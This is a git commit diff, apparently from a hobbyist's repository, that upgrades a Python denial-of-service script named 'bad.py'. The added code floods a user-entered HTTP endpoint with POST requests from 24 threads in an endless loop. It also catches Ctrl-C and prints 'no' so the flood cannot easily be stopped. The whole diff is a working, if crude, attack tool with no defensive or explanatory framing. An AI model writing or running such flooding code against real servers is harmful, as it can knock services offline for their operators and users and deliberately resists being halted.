9ea6a63dd8720a8ec041422190cb844c8dd0ba0c
rohaan <rohaan.m.gajjar@gmail.com>
2026-05-27 22:30:34 -0700

    idk bro why am i even making these

--- dangerous/bad.py
+++ dangerous/bad.py
@@ -1,7 +1,11 @@
 # An extremely basic denial of service script that wont work on anyone who knows what a firewall is
 
 
+input("this one might be worse than the other script, press ctrl C now before its too late")
+
+
 import requests
+from concurrent.futures import ThreadPoolExecutor
 data = 'hi'
 endpoint = input('Enter http endpoint')
 if not endpoint.startswith('http'):
@@ -10,6 +14,16 @@ try:
     requests.post(endpoint, data=data)
 except:
     endpoint = 'http://127.0.0.1:80'
+def ddos(one, two):
+    requests.post(one, data=two)
 
 while 1:
-    requests.post(endpoint, data=data)
+    try:
+        with ThreadPoolExecutor(max_workers=24) as executor:
+            executor.map(ddos, [endpoint], [data])
+    except KeyboardInterrupt:
+        print("no")
+        continue
+    except Exception as e:
+        print(f'Error: {e}')
+        continue
